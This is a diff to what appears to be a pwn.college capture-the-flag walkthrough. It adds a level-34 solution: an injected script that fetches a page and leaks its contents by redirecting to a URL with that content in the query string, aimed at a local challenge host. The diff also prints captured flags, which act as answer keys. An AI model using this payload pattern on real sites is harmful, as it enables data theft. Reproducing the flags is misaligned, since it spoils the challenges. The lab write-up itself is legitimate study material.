@@ -273,7 +273,20 @@ level-33:  >  Run cat /challenge/server and get the endpoint from there and then
 
           Flag: wn.college{cnxNkvnbnNXQEYRHHXzTt4-bNuY.0lNxATNxwyN1YTN0EzW}
 
-level-34:  
+level-34:  > Run cat /challenge/server and get the endpoint from there and then run /challenge/server.
+           > open a new file and write the script
+           > <script>
+             fetch("http://challenge.localhost/submission")
+                .then(response => response.text())
+                .then(website_content => window.location = "http://challenge.localhost/submission?"+website_content);
+             </script>
+           > run /challenge/client
+           > get the flag.
+
+          Flag: pwn.college{829OqK0BbjiIebozWDxeEqDeSq5.01NxATNxwyN1YTN0EzW}
+
+level-35:  
+
 
 
 
